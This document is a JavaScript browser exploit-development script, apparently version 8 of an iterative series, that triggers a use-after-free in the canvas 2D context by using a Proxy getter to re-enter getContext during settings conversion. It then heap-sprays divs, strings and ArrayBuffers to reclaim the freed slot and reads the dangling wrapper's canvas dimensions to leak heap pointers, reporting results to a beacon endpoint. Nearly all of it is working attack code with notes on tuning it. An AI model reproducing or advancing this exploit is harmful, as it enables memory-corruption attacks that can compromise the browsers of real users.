// fa-canvas-next — v8: getter validation + wrapper identity + wild-wrapper lottery
//
// v7 verdict: the bare stale read dies in a fully silent single-task window —
// the freed CanvasRenderingContext2D block is not readable (granule decommit
// or allocator damage beyond the freelist word). The state-buffer exfiltration
// through the stale wrapper is structurally closed: the Vector lives in the
// freed ctx block, and any live context that reclaims the slot points its own
// Vector at its own buffer.
//
// Three open questions remain, all answerable without a bare stale read:
//
//  P1 — getter-op validation: do save()xN + lineWidth = MARKER INSIDE the
//       dictionary conversion survive, and does the destruction then free the
//       grown state buffer cleanly? (v5 died at the read or the getter —
//       never split. v7 died at D1's read before D2-D5 could run.) Each
//       round here does the getter ops + outer + buffered flush, and NO
//       post-free wrapper read at all.
//
//  P2 — wrapper identity: R2-protected round (live-context spray before any
//       touch — the only proven-safe pattern). W1 === sprayCtxs[k]? The
//       wrapper-cache behavior was never measured.
//
//  P3 — wild-wrapper lottery: reclaim the freed ctx slot with NON-context
//       WebCore objects (div elements, 370-char string data blocks, XHR
//       headers — all in or near the 384-512 class). W1.canvas then wraps
//       whatever pointer sits at the m_canvas offset of the reclaiming object
//       as an HTMLCanvasElement; reading .width/.height returns 8 bytes of
//       semi-random live heap memory. Surviving rounds beacon the values —
//       heap-pointer leak candidates. A bad pointer crashes the round (the
//       usual oracle): rounds are cheap, the page reloads.
//
// Beacon prefix: VCN-  (round bodies POSTed after the risky ops)
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = BASE + '/beacon/VCN-' + tag + '?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 300));
      x.open('GET', u, true);
      x.send();
    } catch(e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/VCN-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT');

  var MARKER = 6.02214076e23;

  // ── P1: getter ops + outer, NO post-free read ──────────────────────────
  function getterRound(i, nSaves, useMarker, next) {
    var log = [];
    function R(tag, body) { log.push(tag + (body ? '=' + body : '')); }
    R('G' + i + '-START', 'saves=' + nSaves + ' marker=' + useMarker);
    var canvas = document.createElement('canvas');
    var inner = null, called = false;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!called && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          called = true;
          R('G' + i + '-GETTER', String(prop));
          inner = canvas.getContext('2d');
          R('G' + i + '-INNER', 'ok=' + !!inner);
          if (inner) {
            var sv;
            for (sv = 0; sv < nSaves; sv++) inner.save();
            if (sv === nSaves) R('G' + i + '-SAVES-OK', String(nSaves));
            if (useMarker) {
              inner.lineWidth = MARKER;
              R('G' + i + '-MARKER-OK', '');
            }
          }
        }
        return undefined;
      }
    });
    try {
      var outer = canvas.getContext('2d', settings);
      R('G' + i + '-OUTER', 'ok=' + !!outer + ' same=' + (inner === outer));
      // post-free wrapper reads are FATAL (v7): only verify the outer works
      try { outer.fillRect(0, 0, 2, 2); R('G' + i + '-OUTER-FILL-OK', ''); }
      catch (e) { R('G' + i + '-OUTER-FILL-X', ''); }
    } catch (e) {
      R('G' + i + '-OUTER-X', String(e && e.message || e).substring(0, 80));
    }
    R('G' + i + '-SURVIVED', '');
    BP('G' + i, log.join(' | '));
    setTimeout(next, 300);
  }

  // ── P2: wrapper identity (R2-protected) ────────────────────────────────
  function wrapRound(next) {
    var N = 200;
    var sprayCanvases = [];
    for (var p = 0; p < N; p++) {
      var c = document.createElement('canvas');
      c.width = 8; c.height = 8;
      sprayCanvases.push(c);
    }
    var canvas = document.createElement('canvas');
    var inner = null, called = false;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!called && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          called = true;
          inner = canvas.getContext('2d');
        }
        return undefined;
      }
    });
    var outer = canvas.getContext('2d', settings);
    var sprayCtxs = [];
    for (var s = 0; s < N; s++) sprayCtxs.push(sprayCanvases[s].getContext('2d'));
    var log = [];
    try {
      var ic = inner.canvas;
      var idResult = 'other', aliasIdx = -1;
      if (ic === canvas) idResult = 'original';
      else {
        for (var k = 0; k < N; k++)
          if (ic === sprayCanvases[k]) { aliasIdx = k; idResult = 'spray' + k; break; }
      }
      log.push('ident=' + idResult);
      if (aliasIdx >= 0) log.push('wrapperSame=' + (inner === sprayCtxs[aliasIdx]));
      if (aliasIdx >= 0) {
        inner.lineWidth = 66.5;
        var wIdx = -1;
        for (var k2 = 0; k2 < N; k2++) if (sprayCtxs[k2].lineWidth === 66.5) { wIdx = k2; break; }
        log.push('writethru=' + (wIdx >= 0 ? 'hit' + wIdx : 'miss'));
      }
    } catch (e) { log.push('ident=throw:' + String(e).substring(0, 40)); }
    BP('W', log.join(' '));
    setTimeout(next, 300);
  }

  // ── P3: wild-wrapper lottery ────────────────────────────────────────────
  function lotteryRound(i, next) {
    var log = [];
    function R(tag, body) { log.push(tag + (body ? '=' + body : '')); }
    R('L' + i + '-START', '');
    var canvas = document.createElement('canvas');
    var inner = null, called = false;
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!called && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          called = true;
          inner = canvas.getContext('2d');
        }
        return undefined;
      }
    });
    var outer = canvas.getContext('2d', settings);
    // free happened; reclaim with NON-context objects, silently
    var keep = [];
    for (var d = 0; d < 60; d++) {
      var div = document.createElement('div');
      div.className = 'x' + i; keep.push(div);
    }
    for (var st = 0; st < 60; st++) keep.push('S'.repeat(370));
    for (var ab = 0; ab < 60; ab++) {
      var b = new ArrayBuffer(400); keep.push(b);
      var v = new Uint8Array(b);
      for (var f = 0; f < 400; f += 8) { v[f] = 0x60; v[f + 1] = 0x06; }
    }
    // read the wild canvas: W1.canvas wraps whatever the reclaiming object
    // holds at the m_canvas offset; .width/.height leak 8 bytes of it
    try {
      var wc = inner.canvas;
      if (wc === canvas) R('L' + i + '-CANVAS', 'original');
      else if (wc && wc.width !== undefined) {
        R('L' + i + '-CANVAS', 'wild-width=' + wc.width + ' height=' + wc.height +
          ' tag=' + String(wc.tagName).substring(0, 12));
      } else R('L' + i + '-CANVAS', 'other');
    } catch (e) { R('L' + i + '-CANVAS-X', String(e).substring(0, 40)); }
    R('L' + i + '-SURVIVED', '');
    BP('L' + i, log.join(' | '));
    setTimeout(next, 300);
  }

  var plan = [];
  plan.push(function(next) { getterRound(1, 1, false, next); });
  plan.push(function(next) { getterRound(2, 1, true, next); });
  plan.push(function(next) { getterRound(3, 8, true, next); });
  plan.push(function(next) { wrapRound(next); });
  plan.push(function(next) { lotteryRound(1, next); });
  plan.push(function(next) { lotteryRound(2, next); });
  plan.push(function(next) { lotteryRound(3, next); });

  B('PLAN', 'steps=' + plan.length);
  function run() {
    var step = plan.shift();
    if (!step) { B('DONE-ALL-SURVIVED'); return; }
    step(run);
  }
  setTimeout(run, 200);
})();
